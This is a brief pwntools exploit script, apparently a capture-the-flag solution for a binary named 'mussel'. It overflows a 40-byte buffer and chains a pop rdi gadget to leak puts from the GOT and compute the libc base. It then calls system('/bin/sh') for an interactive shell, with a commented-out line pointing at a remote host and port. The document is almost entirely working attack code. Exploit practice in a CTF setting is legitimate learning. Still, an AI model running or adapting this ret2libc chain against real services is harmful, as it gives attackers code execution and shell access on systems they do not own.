from pwn import *

bin='./mussel'
libc = ELF('libc6_2.19-18+deb8u10_amd64.so')
offset=40
pop_rdi=0x4006c3
main=0x40061a
e=ELF(bin)
p=process(bin)
#p=connect('34.185.173.244',31523)


#1 --- leaking libc

payload1=b'A'*offset+p64(pop_rdi)+p64(e.got['puts'])+p64(e.plt['puts'])+p64(main)
p.sendline(payload1)
p.recvline()
leak = u64(p.recvline().rstrip().ljust(8, b"\x00"))
p.info(f"puts: {hex(leak)}")

#1.5 --- libc base
libc.address=leak - libc.symbols['puts']

BINSH = next(libc.search(b"/bin/sh"))
SYSTEM = libc.sym["system"]


log.success(f"libc base @ {hex(libc.address)}")
log.info(f"/bin/sh @ {hex(BINSH)}")
log.info(f"system @ {hex(SYSTEM)}")


#2 --- shelling
#gdb.attach(p)
payload2=b'A'*offset+p64(pop_rdi)+p64(BINSH)+p64(SYSTEM)+p64(0)

p.sendline(payload2)
p.interactive()
